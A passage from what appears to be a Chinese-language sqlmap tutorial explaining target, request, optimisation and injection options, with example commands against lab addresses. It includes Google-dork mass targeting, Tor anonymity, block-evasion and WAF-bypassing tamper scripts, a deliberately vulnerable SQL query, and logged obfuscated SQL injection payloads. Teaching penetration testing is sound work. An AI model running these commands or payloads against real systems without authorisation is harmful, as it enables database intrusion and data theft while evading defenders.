parameters)</span><br></pre></td></tr></table></figure></p><p>没有找到有GET参数的可用链接。就我有限的经验而言，站点地图中的URL很少包含GET参数，POST参数就更不用说了。所以Sqlmap的这一功能似乎有些鸡肋。</p><p><strong><em>5.从文本文件中解析目标</em></strong><br><strong>参数：-m</strong><br>参数“-u”一次只能指定一个URL，若有多个URL需要测试就显得很不方便，我们可用将多个URL以一行一个的格式保存在文本文件中，然后使用参数“-m”，后跟该文本文件路径，让Sqlmap依次读取文件中的URL作为攻击目标。</p><p>如我们有文件url.txt，内容为：</p><pre><code>www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1*</code></pre><p>然后可用使用如下命令让Sqlmap测试这些URL是否存在注入漏洞：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m url.txt</span><br></pre></td></tr></table></figure></p><p>同样,执行该命令时，Sqlmap会很贴心地一个个询问：“do you want to test this URL?”</p><p><strong><em>6.从文件载入HTTP请求</em></strong><br><strong>参数：-r</strong><br>可以将一个HTTP请求保存在文件中，然后使用参数“-r”加载该文件，Sqlmap会解析该文件，从该文件分析目标并进行测试。<br>设有如下所示的HTTP请求保存在文件get.txt中：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?id=1 HTTP/1.1</span><br><span class="line">Host: 192.168.56.101:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>则使用如下命令让Sqlmap解析该文件，以该文件中HTTP请求目标为攻击目标进行测试：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r get.txt</span><br></pre></td></tr></table></figure></p><p><strong><em>7.将Google搜索结果作为攻击目标</em></strong><br><strong>参数：-g</strong><br>Sqlmap能自动获取Google搜索的前一百个结果，对其中有GET参数的URL进行注入测试。当然，所处的网络环境要能访问Google才行。下面是Sqlmap手册中“-g”参数的例子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -g <span class="hljs-string">"inurl:\".php?id=1\""</span></span><br></pre></td></tr></table></figure></p><p><strong><em>8.从配置文件中载入攻击目标</em></strong><br><strong>参数：-c</strong><br>使用参数“-c”指定一个配置文件（如：sqlmap.conf），Sqlmap会解析该配置文件，按照该配置文件的配置执行动作。配置文件中可以指定攻击目标，实际上除了攻击目标外，配置文件还可以指定各种参数的值。</p><p>Sqlmap的按照目录中有一个名为sqlmap.conf的文件，该文件是配置文件的模板，看看该文件内容，就能明白配置文件是什么意思了。</p><h3 id="0x05-请求"><a href="#0x05-请求" class="headerlink" title="0x05 请求"></a>0x05 请求</h3><p>HTTP是一个复杂的协议。HTTP请求有很多种方法（method），可以在不同位置（GET、POST、cookie和User-Agent等）携带不同参数。往往只有在特定位置携带了特定参数以特定方法发起的请求才是合法有效的请求。Sqlmap运行时除了需要指定目标，有时还需要指定HTTP请求的一些细节。下面这些参数都用于指定HTTP请求细节。</p><p><strong><em>1.HTTP方法</em></strong><br><strong>参数：–method</strong><br>一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“–method”来指定方法。如：“–method=PUT”。</p><p><strong><em>2.POST数据</em></strong><br><strong>参数：–data</strong><br>该参数指定的数据会被作为POST数据提交，Sqlmap也会检测该参数指定数据是否存在注入漏洞。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102:8080/user.php"</span> --data=<span class="hljs-string">"id=0&amp;name=werner"</span></span><br></pre></td></tr></table></figure></p><p><strong><em>3.指定分隔符</em></strong><br><strong>参数：–param-del</strong><br>上一个例子中“–data”的数据“id=0&amp;name=werner”其实由两个部分组成：“id=0”和“name=werner”，默认地以“&amp;”作为分隔符。我们可以使用“–param-del”来指定分隔符，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102:8080/user.php"</span> --data=<span class="hljs-string">"id=0;name=werner"</span> --param-del=<span class="hljs-string">";"</span></span><br></pre></td></tr></table></figure></p><p><strong><em>4.cookie</em></strong><br><strong>参数：–cookie、–cookie-del、–drop-set-cookie和–load-cookies</strong><br>有两种情况会用到这些参数：</p><pre><code>要测试的页面只有在登录状态下才能访问，登录状态用cookie识别想要检测是否存在cookie注入</code></pre><p>当“–level”设置为2或更高时，Sqlmap会检测cookie是否存在注入漏洞，关于“–level”的更多信息见下文。</p><p><em>(1).“–cookie”和“–cookie-del”</em><br>在浏览器中登录目标网站后复制出维持登录状态的cookie，用参数“–cookie”来指定这些cookie，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102:8080/user.php"</span> --cookie <span class="hljs-string">"JSESSIONID=E5D6C8C81;NAME=werner;"</span></span><br></pre></td></tr></table></figure></p><p>与POST参数不同，cookie默认的分隔符为“;”，想要指定cookie中的分隔符，使用参数“–cookie-del”。</p><p><em>(2).“–drop-set-cookie”</em><br>若HTTP响应头中有“Set-Cookie”，Sqlmap会自动设置“Set-Cookie”设置的cookie，并对这些cookie进行检测。若不想让Sqlmap这么做，添加参数“–drop-set-cookie”即可，这样，Sqlmap会忽略“Set-Cookie”。</p><p><em>(3).“–load-cookies”</em><br>该参数用于从文件中载入Netscape或wget格式的cookie。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget可以保存和载入cookie，示例如下：</span><br><span class="line"></span><br><span class="line">  # Log in to the server.  This can be done only once.</span><br><span class="line">  wget --save-cookies cookies.txt \</span><br><span class="line">       --post-data &apos;user=foo&amp;password=bar&apos; \</span><br><span class="line">       http://server.com/auth.php</span><br><span class="line">     </span><br><span class="line">  # Now grab the page or pages we care about.</span><br><span class="line">  wget --load-cookies cookies.txt \</span><br><span class="line">       -p http://server.com/interesting/article.php</span><br></pre></td></tr></table></figure></p><p><strong><em>5.User-Agent</em></strong><br><strong>参数：–user-agent和–random-agent</strong><br>默认情况下Sqlmap发送的HTTP请求中的User-Agent值为：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure></p><p>使用参数“–user-agent”可以指定一个User-Agent值。但正常的User-Agent值长什么样我们可能并不记得，所以有了参数“–random-agent”，使用该参数，Sqlmap会从文件./txt/user-agents.txt中随机地取一个User-Agent。注意，在一次会话中只有使用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent。</p><p>用如下命令统计user-agents.txt行数：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sqlmap/txt/user-agents.txt | wc -l</span><br></pre></td></tr></table></figure></p><p>结果为4211，当然其中还包含空行、注释等，但总的来说该文件中存储的User-Agent也有4千多个。</p><p>当“–level”设置为3或更高时，Sqlmap会检测User-Agent是否存在注入漏洞，关于“–level”的更多信息见下文。</p><p><strong><em>6.Host</em></strong><br><strong>参数：–host</strong><br>使用该参数可以手动指定HTTP头中的Host值。</p><p>当“–level”设置为5或更高时，Sqlmap会检测Host是否存在注入漏洞，关于“–level”的更多信息见下文。</p><p><strong><em>7.Referer</em></strong><br><strong>参数：–referer</strong><br>使用该参数可以指定HTTP头中的Referer值。Sqlmap发送的HTTP请求头部默认无Referer字段。</p><p>当“–level”设置为3或更高时，Sqlmap会检测Referer是否存在注入漏洞，关于“–level”的更多信息见下文。</p><p><strong><em>8.额外的HTTP头</em></strong><br><strong>参数：–headers</strong><br>使用该参数可以在Sqlmap发送的HTTP请求报文头部添加字段，若添加多个字段，用“\n”分隔。如命令：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.101:8080/"</span> -v 5 --headers <span class="hljs-string">"X-A:A\nX-B: B"</span></span><br></pre></td></tr></table></figure></p><p>发送的HTTP请求包为：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">X-B: B</span><br><span class="line">Host: 192.168.56.101:8080</span><br><span class="line">Accept-encoding: gzip,deflate</span><br><span class="line">X-A: A</span><br><span class="line">Accept: */*</span><br><span class="line">User-agent: sqlmap/1.1.10#stable (http://sqlmap.org)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p><p>加参数“-v 5”是为了让Sqlamp输出发送的HTTP请求包，便于我们观察。</p><p><strong><em>9.身份认证</em></strong><br><strong>参数：–auth-type和–auth-cred</strong><br>这些参数用于进行身份认证。“–auth-type”用于指定认证方式，支持以下三种身份认证方式：</p><pre><code>BasicDigestNTLM</code></pre><p>“–auth-cred”用于给出身份认证的凭证，格式是“username:password”。</p><p>如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1"</span> --auth-type Basic --auth-cred <span class="hljs-string">"testuser:testpass"</span></span><br></pre></td></tr></table></figure></p><p><strong><em>10.基于证书的身份认证</em></strong><br><strong>参数：–auth-file</strong><br>若Web服务器要求客户端提供证书则可以使用此参数指定一个PEM格式的证书文件。我们知道SSL协议的客户端认证是可选的，实践中一般都只用服务器端提供自己的证书供客户端验证，很少要求客户端提供自己的证书。</p><p><strong><em>11.忽略401</em></strong><br><strong>参数：–ignore-401</strong><br>使用该参数忽略401错误（未认证）。</p><p><strong><em>12.HTTP(S)代理</em></strong><br><strong>参数：–proxy、–proxy-cred、–proxy-file和–ignore-proxy</strong><br>使用参数“–proxy”来设置一个HTTP(S)代理，格式是“http(s)://url:port”。若代理需要认证，使用参数“–proxy-cred”来提供认证凭证，格式是“username:password”。</p><p>使用参数“–proxy-file”指定一个存储着代理列表的文件，Sqlmap会依次使用文件中的代理，当某个代理有任何连接问题时就会被弃用而换下一个代理。</p><p>使用参数“–ignore-proxy”忽略本地代理设置。</p><p><strong><em>13.Tor匿名网络</em></strong><br><strong>参数：–tor、–tor-type、–tor-port和–check-tor</strong><br>不管出于什么原因，如果想要保持匿名状态与其使用单个的HTTP(S)代理，不如安装类似Privoxy这样的软件按照Tor的安装指导配置一个Tor客户端。设置好后使用参数“–tor”让Sqlmap自动设置使用Tor代理。</p><p>如果想要手动指定Tor的类型和端口可以使用参数“–tor-type”和“–tor-port”，如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tor-type=SOCKS5 --tor-port 9050</span><br></pre></td></tr></table></figure></p><p>如果要求高度的匿名性可以使用参数“–check-tor”，加上该参数后Sqlmap会确保所有流量都走Tor代理，若Tor代理失效，Sqlmap会发出警告并退出。检测方法是访问Are you using Tor?</p><p><strong><em>14.HTTP请求之间添加延迟</em></strong><br><strong>参数：–delay</strong><br>过于频繁地发送请求可能会被网站察觉或有其他不良后果。使用参数“–delay”来指定HTTP请求之间的延迟，单位为秒，类型是浮点数，如“–delay 1.5”表示延迟1.5秒。默认是没有延迟的。</p><p><strong><em>15.超时</em></strong><br><strong>参数：–timeout</strong><br>超时时间默认为30秒，可以用参数“–timeout”指定超时时间，如“–timeout 44.5”表示设置超时时间为44.5秒。</p><p><strong><em>16.超时后最大重试次数</em></strong><br><strong>参数：–retries</strong><br>超时后Sqlmap会进行重试，最大重试次数默认为3，可以用参数“–retries”指定最大重试次数。</p><p><strong><em>17.随机化参数值</em></strong><br><strong>参数：–randomize</strong><br>使用该参数，Sqlmap会随机生成每次HTTP请求中参数的值，值的类型和长度依照于原始值。</p><p><strong><em>18.用正则表达式过滤代理日志</em></strong><br><strong>参数：–scope</strong><br>指定一个Python正则表达式对代理日志进行过滤，只测试符合正则表达式的目标，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -l burp.log --scope=<span class="hljs-string">"(www)?\.target\.(com|net|org)"</span></span><br></pre></td></tr></table></figure></p><p><strong><em>19.避免错误请求过多而被屏蔽</em></strong><br><strong>参数：–safe-url、–safe-post、–safe-req和–safe-freq</strong><br>有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。有以下四个参数与这一机制有关：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">–safe-url: 隔一会就访问一下的安全URL</span><br><span class="line">–safe-post: 访问安全URL时携带的POST数据</span><br><span class="line">–safe-req: 从文件中载入安全HTTP请求</span><br><span class="line">–safe-freq: 每次测试请求之后都会访问一下的安全URL</span><br></pre></td></tr></table></figure></p><p>这里所谓的安全URL是指访问会返回200、没有任何报错的URL。相应地，Sqlmap也不会对安全URL进行任何注入测试。</p><p><strong><em>20.关闭URL编码</em></strong><br><strong>参数：–skip-urlencode</strong><br>Sqlmap默认会对URL进行URL编码，可以使用该参数关闭URL编码。</p><p><strong><em>21.绕过CSRF保护</em></strong><br><strong>参数：–csrf-token和–csrf-url</strong><br>现在有很多网站通过在表单中添加值为随机生成的token的隐藏字段来防止CSRF攻击，Sqlmap会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。</p><p>“–csrf-token”用于指定包含token的隐藏字段名，若这个字段名不是常见的防止CSRF攻击的字段名Sqlmap可能不能自动识别出，需要手动指定。如Django中该字段名为“csrfmiddlewaretoken”，明显与CSRF攻击有关。</p><p>“–csrf-url”用于从任意的URL中回收token值。若最初有漏洞的目标URL中没有包含token值而又要求在其他地址提取token值时该参数就很有用。</p><p><strong><em>22.强制使用SSL</em></strong><br><strong>参数：–force-ssl</strong></p><p><strong><em>23.在每次请求前执行特定Python代码</em></strong><br><strong>参数：–eval</strong><br>直接看例子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b"</span> --<span class="hljs-built_in">eval</span>=<span class="hljs-string">"import hashlib;hash=hashlib.md5(id).hexdigest()"</span></span><br></pre></td></tr></table></figure></p><p>每次返送请求前，Sqlmap都会依据id值重新计算hash值并更新GET请求中的hash值。</p><h3 id="0x06-优化"><a href="#0x06-优化" class="headerlink" title="0x06 优化"></a>0x06 优化</h3><p>这些参数可以优化Sqlmap的性能。<br><strong><em>1.一键优化</em></strong><br><strong>参数：-o</strong><br>添加此参数相当于同时添加下列三个优化参数：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">–keep-alive</span><br><span class="line">–null-connection</span><br><span class="line">–threads=3 （如果没有设置一个更好的值）</span><br></pre></td></tr></table></figure></p><p>这些参数具体含义见后文。</p><p><strong><em>2.HTTP长连接</em></strong><br><strong>参数：–keep-alive</strong><br>该参数让Sqlmap使用HTTP长连接。该参数与“–proxy”矛盾。</p><p><strong><em>3.HTTP空连接</em></strong><br><strong>参数：–null-connection</strong><br>有一种特殊的HTTP请求类型可以直接获得HTTP响应的大小而不用获得HTTP响应体。显然这在布尔型盲注中可以节约很大的带宽。当然这一技术是需要服务器端支持的。该参数与“–text-only”矛盾。<br><strong><em>4.HTTP并发</em></strong><br><strong>参数：–threads</strong><br>使用该参数指定Sqlmap可以达到的最大并发数。从性能和网站承受能力两方面考虑最大并发数不要超过10。</p><h3 id="0x07-注入"><a href="#0x07-注入" class="headerlink" title="0x07 注入"></a>0x07 注入</h3><p>这些参数被用于指定要测试的参数、定制攻击荷载和选择篡改脚本。<br><strong><em>1.要测试的注入点</em></strong><br><strong>参数：-p和–skip</strong><br>默认情况下Sqlmap会测试所有GET参数和POST参数，当level大于等于2时会测试cookie参数，当level大于等于3时会测试User-Agent和Referer。实际上还可以手动指定一个以逗号分隔的、要测试的参数列表，该列表中的参数不受level限制。这就是“-p”的作用。</p><p>举个例子，若想只测试GET参数“id”和User-Agent，则可以这么写：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p &quot;id,user-agent&quot;</span><br></pre></td></tr></table></figure></p><p>如果不想测试某一参数则可以使用“–skip”。如设置了level为5但不想测试User-Agent和Referer，则可以这么写：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--level=5 --skip=&quot;user-agent,referer&quot;</span><br></pre></td></tr></table></figure></p><p>有时会遇到伪静态网页。动态网页会明目张胆地列出参数，如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?id=1</span><br></pre></td></tr></table></figure></p><p>显然参数是id，值为1。但若是伪静态网页则可能这样写：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/1/</span><br></pre></td></tr></table></figure></p><p>将参数隐藏在URL中。通常情况下Sqlmap不会对这样的伪静态网页的参数做测试，因为Sqlmap无法判断哪个是参数。若想要对这样的伪静态进行测试，只需要加上“*”，告诉Sqlmap哪个是伪静态参数就行，剩下事的和GET参数没有什么区别。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http(s)://target.cc/user/1*/"</span></span><br></pre></td></tr></table></figure></p><p><strong><em>2.指定数据库管理系统</em></strong><br><strong>参数：–dbms</strong><br>dbms是“Database Management System”的缩写。默认情况下Sqlmap会自动检测网站使用的数据库管理系统，Sqlmap支持以下这些数据库管理系统：</p><pre><code>MySQLOraclePostgreSQLMicrosoft SQL ServerMicrosoft AccessFirebirdSQLiteSybaseSAP MaxDBDB2</code></pre><p>如果Sqlmap自动检测失败或是不想让Sqlmap进行数据库指纹检测，可以使用参数“–dbms”手动指定数据库管理系统，如：“–dbms postgresql”。</p><p>对于Mysql和Microsoft SQL Server和要这样指定：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--dbms MySQL &lt;version&gt;</span><br><span class="line">--dbms Microsoft SQL Server &lt;version&gt;</span><br></pre></td></tr></table></figure></p><p>对于MySQL来说，是类似这样的：5.0。对于Microsoft SQL Server来说，是类似这样的：2005。</p><p>如果在添加“–dbms”参数的同时还添加了“–fingerprint”，Sqlmap只会在指定的数据库管理系统内进行指纹识别。只有在很确定时使用“–dbms”，否则还是让Sqlmap自动检测更好些。</p><p><strong><em>3.指定运行数据库管理系统的操作系统</em></strong><br><strong>参数：–os</strong><br>默认情况下Sqlmap会自动检测运行数据库管理系统的操作系统，目前完全支持的操作系统有：</p><pre><code>LinuxWindows</code></pre><p>如果很确定可以使用参数“–os”指定运行数据库管理系统的操作系统。当然在只用很确定时才应该使用此参数，否则还是让Sqlmap自动检测更好些。</p><p><strong><em>4.生成无效参数值时强制使用大数</em></strong><br><strong>参数：–invalid-bignum</strong><br>有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-bignum”，Sqlmap就会取大数（如：id=99999999）作为无效参数。</p><p><strong><em>5.生成无效参数值时强制使用逻辑操作符</em></strong><br><strong>参数：–invalid-logical</strong><br>有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-logical”，Sqlmap就会使用逻辑操作符（如：id=13 AND 18=19）作为无效参数。</p><p><strong><em>6.生成无效参数值时强制使用字符串</em></strong><br><strong>参数：–invalid-string</strong><br>有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-logical”，Sqlmap就会使用字符串（如：id=akewmc）作为无效参数。</p><p><strong><em>7.关闭payload转换</em></strong><br><strong>参数：–no-cast</strong><br>在检索结果时Sqlmap会将所有输入转换为字符串类型，若遇到空值（NULL）则将其替换为空白字符。<br>这样做是为了防止如连接空值和字符串之类的任何错误发生并可以简化数据检索过程。<br>但是有报告显示在老版本的Mysql中这样做会导致数据检索出现问题，因此添加了“–no-cast”来告诉Sqlmap不要这样做。</p><p><strong><em>8.关闭字符串编码</em></strong><br><strong>参数：–no-escape</strong><br>有时Sqlmap会使用用单引号括起来的字符串值作为payload，如“SELECT ‘foobar’”，默认地这些值会被编码，如上例将被编码为：<br>“SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))”。这样做既可以混淆视听让人一时难以洞察payload的内容又可以在后台服务器使用类似magic_quote或mysql_real_escape_string这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减payload长度，用户可以使用“–no-escape”来关闭字符串编码。</p><p><strong><em>9.定制payload</em></strong><br><strong>参数：–prefix和–suffix</strong><br>有时只有在payload后添加用户指定的后缀才能注入成功。另一种场景是用户已经知道查询语句怎么写的，此时可以直接指定payload的前缀和后缀来完成检测和注入。</p><p>一个有漏洞的源码示例如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="hljs-string">"SELECT * FROM users WHERE id=('"</span> . $\_GET[<span class="hljs-string">'id'</span>] . <span class="hljs-string">"') LIMIT 0, 1"</span>;</span><br></pre></td></tr></table></figure></p><p>对这样的例子可以让Sqlmap自动检测边界范围也可以手动指出边界范围：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1"</span> -p id --prefix <span class="hljs-string">"')"</span> --suffix <span class="hljs-string">"AND ('abc'='abc"</span></span><br></pre></td></tr></table></figure></p><p>最终SQL语句会变成：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">'1'</span>) &lt;PAYLOAD&gt; <span class="hljs-keyword">AND</span> (<span class="hljs-string">'abc'</span>=<span class="hljs-string">'abc'</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br></pre></td></tr></table></figure></p><p>这个句子语法是正确的，payloa也能执行。</p><p>在简单的测试环境下Sqlmap不需要被提供定制的边界范围就能够自动检测并完成注入，但在真实世界中某些应用可能会很复杂如嵌套JOIN查询，此时就需要为Sqlmap指明边界范围。</p><p><strong><em>10.修改注入数据</em></strong><br><strong>参数：–tamper</strong><br>除了用CHAR()编码字符串外Sqlmap没有对payload进行任何混淆。<br>该参数用于对payload进行混淆以绕过IPS或WAF。<br>该参数后跟一个tamper脚本的名字。<br>若该tamper脚本位于sqlmap的安装目录的tamper/目录中，就可以省略路径和后缀名，只写文件名。<br>多个tamper脚本之间用空格隔开。</p><p>在tamper/目录中有许多可用的tamper脚本。tamper脚本的作用是对payload进行混淆。<br>我们还可以自己写tamper脚本，这属于Sqlmap的高级用法，一个有效的tamper脚本如下所示：</p><pre><code># 必须要导入的库from lib.core.enums import PRIORITY# 定义该tamper脚本的优先级__priority__ = PRIORITY.NORMALdef tamper(payload):  &apos;&apos;&apos;此处是tamper的说明&apos;&apos;&apos;  retVal = payload  # 此处是用于修改payload的代码  # 返回修改后的payload  return retVal</code></pre><p>下面是一个示例，该示例的目标是Mysql，假定大于号、空格和开头的SELECT是被禁止的：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.101:8080/ScorePrj/?id=1"</span> \</span><br><span class="line">--tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br></pre></td></tr></table></figure></p><p>该示例部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[12:55:52] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[12:55:52] [INFO] loading tamper script <span class="hljs-string">'between'</span></span><br><span class="line">[12:55:52] [INFO] loading tamper script <span class="hljs-string">'randomcase'</span></span><br><span class="line">[12:55:52] [INFO] loading tamper script <span class="hljs-string">'space2comment'</span></span><br><span class="line">[...]</span><br><span class="line">[12:55:53] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter <span class="hljs-string">'id'</span></span><br><span class="line">[12:55:53] [INFO] testing <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">[12:55:53] [PAYLOAD] 1</span><br><span class="line">[12:55:53] [PAYLOAD] 1)/**/aNd/**/8083=4737/**/aNd/**/(4754/**/BetwEen/**/4754/**/aNd/**/4754</span><br><span class="line">[12:55:53] [PAYLOAD] 1)/**/anD/**/4962=4962/**/anD/**/(2361/**/BeTweEN/**/2361/**/anD/**/2361</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/aNd/**/9754/**/BETwEEn/**/1206/**/aNd/**/1206</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/AnD/**/4962/**/beTweEn/**/4962/**/AnD/**/4962</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/aND/**/2741/**/BetWeEn/**/9323/**/aND/**/9323--/**/Ihsa</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/anD/**/4962/**/BetweEN/**/4962/**/anD/**/4962--/**/wVUI</span><br><span class="line">[12:55:53] [PAYLOAD] 1<span class="hljs-string">')/**/anD/**/1694=6061/**/anD/**/('</span>zLwu<span class="hljs-string">'='</span>zLwu</span><br><span class="line">[12:55:53] [PAYLOAD] 1<span class="hljs-string">')/**/ANd/**/4962=4962/**/ANd/**/('</span>Dsfw<span class="hljs-string">'='</span>Dsfw</span><br><span class="line">[12:55:53] [PAYLOAD] 1<span class="hljs-string">'/**/aND/**/6307=8901/**/aND/**/'</span>fKLn<span class="hljs-string">'='</span>fKLn</span><br><span class="line">[12:55:53] [PAYLOAD] 1<span class="hljs-string">'/**/aNd/**/4962=4962/**/aNd/**/'</span>YFsp<span class="hljs-string">'='</span>YFsp</span><br><span class="line">[12:55:53] [PAYLOAD] 1%<span class="hljs-string">'/**/anD/**/3549=6854/**/anD/**/'</span>%<span class="hljs-string">'='</span></span><br><span class="line">[12:55:53] [PAYLOAD] 1%<span class="hljs-string">'/**/aND/**/4962=4962/**/aND/**/'</span>%<span class="hljs-string">'='</span></span><br><span class="line">[...]</span><br><span class="line">[12:55:54] [PAYLOAD] 1)/**/uNIoN/**/alL/**/Select/**/nuLl--/**/NRtq</span><br><span class="line">[12:55:54] [PAYLOAD] 1)/**/UnIOn/**/alL/**/sElEcT/**/nuLL,nuLL--/**/jalk</span><br><span class="line">[12:55:54] [PAYLOAD] 